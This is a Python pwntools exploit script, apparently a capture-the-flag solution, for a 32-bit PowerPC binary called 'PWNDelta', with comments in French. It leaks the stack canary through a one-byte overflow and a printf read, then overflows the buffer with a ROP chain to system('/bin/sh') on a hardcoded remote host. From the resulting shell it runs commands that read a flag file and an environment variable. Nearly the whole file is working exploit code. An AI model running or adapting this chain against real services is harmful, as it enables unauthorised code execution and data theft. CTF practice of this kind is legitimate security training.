#!/usr/bin/env python3
# PWNDelta - PowerPC 32-bit big-endian, static, No PIE, canary.
#
# Bug : machine a etats dans vuln().
#   - etat 5 : read(0, buf, 0x41=65)  -> overflow d'1 octet sur le MSB (nul) du canary
#   - etat 6 : printf("Hello, %s", buf) -> fuite (le %s ne s'arrete plus sur le zero efface)
#   - etat 8 : read(0, buf, 0x6c=108) -> vrai debordement jusqu'au LR sauve
#
# Exploit :
#   1. Fuite du canary : on envoie 64 octets + 1 octet non-nul (0xff). Ce 0xff ecrase le
#      MSB nul du canary (gros-boutiste), donc le %s continue et affiche les 3 octets bas.
#      vrai canary = 0x00 || (3 octets fuites).
#   2. ROP vers system("/bin/sh"). Apres l'epilogue de vuln : r1 = buf+84, on controle LR.
#      a) LR = gadget_load_r9 (0x100007cc) : son 'stwu r1,-0x30' pivote r1 -> buf+36 (on
#         recupere ~72 o d'espace ROP), puis sa queue fait pop LR=[buf+40], r1=buf+44.
#      b) [buf+40] = pop_r3 (0x1006c9b4) : lwz r3,0x10(r1) ; lwz r0,0x24(r1) ; ... ; mtlr r0 ; blr
#         a r1=buf+44 -> r3 = [buf+60], LR = [buf+80].
#      c) [buf+60] = &"/bin/sh" (0x10074850) -> r3 ;  [buf+80] = system (0x100020d0) -> saut.
#
# Robustesse : le service distant est derriere socat (stdin = pipe) ; un read() sur pipe peut
# renvoyer moins que demande. Si les 108 octets n'arrivent pas d'un bloc, le canary n'est pas
# reecrit -> __stack_chk_fail. On re-tente jusqu'a voir le shell.
from pwn import *

context.clear(arch='powerpc', endian='big', bits=32)
context.log_level = 'info'

HOST, PORT = "169.58.126.107", 5011

GADGET_LOAD_R9 = 0x100007cc
POP_R3         = 0x1006c9b4
BINSH          = 0x10074850
SYSTEM         = 0x100020d0


def build_payload(canary):
    buf = bytearray(b"B" * 108)
    buf[40:44] = p32(POP_R3)       # prochain LR (lu par gadget_load_r9)
    buf[60:64] = p32(BINSH)        # -> r3
    buf[64:68] = canary            # canary restaure (verifie en etat 9)
    buf[80:84] = p32(SYSTEM)       # LR de pop_r3 -> system
    buf[88:92] = p32(GADGET_LOAD_R9)  # LR sauve lu par l'epilogue de vuln
    return bytes(buf)


def attempt():
    io = remote(HOST, PORT)
    io.recvuntil(b"name: ")
    io.send(b"A" * 64 + b"\xff")
    io.recvuntil(b"Hello, ")
    leaked = io.recvline()[64:68]          # [0xff, c1, c2, c3]
    canary = b"\x00" + leaked[1:4]
    log.info("canary = %s", canary.hex())
    io.recvuntil(b"keeper: ")
    io.send(build_payload(canary))
    if not io.recvuntil(b"Message received.", timeout=5):
        io.close(); return None
    io.sendline(b"echo OK_$(id -u); echo \"$FLAG\"; cat /flag/flag.txt 2>/dev/null")
    out = io.recvrepeat(3)
    io.close()
    return out


def main():
    for i in range(10):
        out = attempt()
        if out and b"OK_" in out:
            print(out.decode(errors="replace"))
            m = re.search(rb"CTF\{[^}]+\}", out)
            if m:
                log.success("FLAG = %s", m.group().decode())
            return
        log.warning("essai %d : read partiel, on recommence", i)


if __name__ == "__main__":
    main()
